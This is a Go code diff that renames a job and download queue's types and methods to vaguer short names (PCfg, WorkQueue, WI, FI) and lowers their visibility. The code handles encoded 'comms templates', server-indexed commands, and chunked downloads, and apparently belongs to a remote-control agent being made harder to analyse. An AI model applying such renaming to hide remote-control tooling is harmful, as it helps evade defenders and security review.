@@ -10,25 +10,25 @@ import (
 	"time"
 )
 
-// CommsTemplate stores communications-related template strings
-type CommsTemplate struct {
+// PCfg stores communications-related template strings
+type PCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
 	Params    []string `json:"p"`
 }
 
-// Global comms template storage for job manager (uses SecureTemplate for memory zeroing)
-var globalCommsTpl *SecureTemplate
+// Global comms template storage for job manager (uses SafeTemplate for memory zeroing)
+var globalCommsTpl *SafeTemplate
 
 // Job manager template index constant
 const idxJmTypeDownload = 785 // download - matches server's IdxCqCmdDownload
 
-// setCommsTemplate stores the comms template (converts to SecureTemplate)
-func setCommsTemplate(tpl *CommsTemplate) {
-	// Zero old template before replacing
+// setCommsTemplate stores the comms template (converts to SafeTemplate)
+func setCommsTemplate(tpl *PCfg) {
+	// zero old template before replacing
 	if globalCommsTpl != nil {
-		globalCommsTpl.Zero()
+		globalCommsTpl.zero()
 	}
 	globalCommsTpl = NewSecureTemplateFromSlices(tpl.Version, tpl.Type, tpl.Templates, tpl.Params)
 }
@@ -43,13 +43,13 @@ func commsTpl(idx int) string {
 	return globalCommsTpl.Get(idx)
 }
 
-// CreateJob creates a new job with specified type and filename
-func (cq *CommandQueue) CreateJob(jobType string, filename string) string {
+// createJob creates a new job with specified type and filename
+func (cq *WorkQueue) createJob(jobType string, filename string) string {
 	cq.mu.Lock()
 	defer cq.mu.Unlock()
 
 	jobID := fmt.Sprintf("%s_%d", jobType, time.Now().UnixNano())
-	cq.activeJobs[jobID] = JobInfo{
+	cq.activeJobs[jobID] = WI{
 		ID:        jobID,
 		StartTime: time.Now(),
 		Filename:  filename,
@@ -60,8 +60,8 @@ func (cq *CommandQueue) CreateJob(jobType string, filename string) string {
 	return jobID
 }
 
-// CompleteJob marks a job as completed
-func (cq *CommandQueue) CompleteJob(jobID string) {
+// completeJob marks a job as completed
+func (cq *WorkQueue) completeJob(jobID string) {
 	cq.mu.Lock()
 	defer cq.mu.Unlock()
 
@@ -71,8 +71,8 @@ func (cq *CommandQueue) CompleteJob(jobID string) {
 	}
 }
 
-// KillJob terminates an active job
-func (cq *CommandQueue) KillJob(jobID string) error {
+// killJob terminates an active job
+func (cq *WorkQueue) killJob(jobID string) error {
 	cq.mu.Lock()
 	defer cq.mu.Unlock()
 
@@ -90,8 +90,8 @@ func (cq *CommandQueue) KillJob(jobID string) error {
 	return nil
 }
 
-// AddOrUpdateDownload adds or updates a download operation
-func (cq *CommandQueue) AddOrUpdateDownload(filename string, filepath string, totalChunks int) {
+// addOrUpdateDownload adds or updates a download operation
+func (cq *WorkQueue) addOrUpdateDownload(filename string, filepath string, totalChunks int) {
 	cq.mu.Lock()
 	defer cq.mu.Unlock()
 
@@ -101,7 +101,7 @@ func (cq *CommandQueue) AddOrUpdateDownload(filename string, filepath string, to
 			downloadInfo.InProgress = true
 		}
 	} else {
-		cq.activeDownloads[filename] = &DownloadInfo{
+		cq.activeDownloads[filename] = &FI{
 			FilePath:    filepath,
 			TotalChunks: totalChunks,
 			NextChunk:   1,
@@ -111,8 +111,8 @@ func (cq *CommandQueue) AddOrUpdateDownload(filename string, filepath string, to
 	}
 }
 
-// UpdateDownloadProgress updates the progress of a download operation
-func (cq *CommandQueue) UpdateDownloadProgress(filename string, chunkNum int) {
+// updateDownloadProgress updates the progress of a download operation
+func (cq *WorkQueue) updateDownloadProgress(filename string, chunkNum int) {
 	cq.mu.Lock()
 	defer cq.mu.Unlock()
 
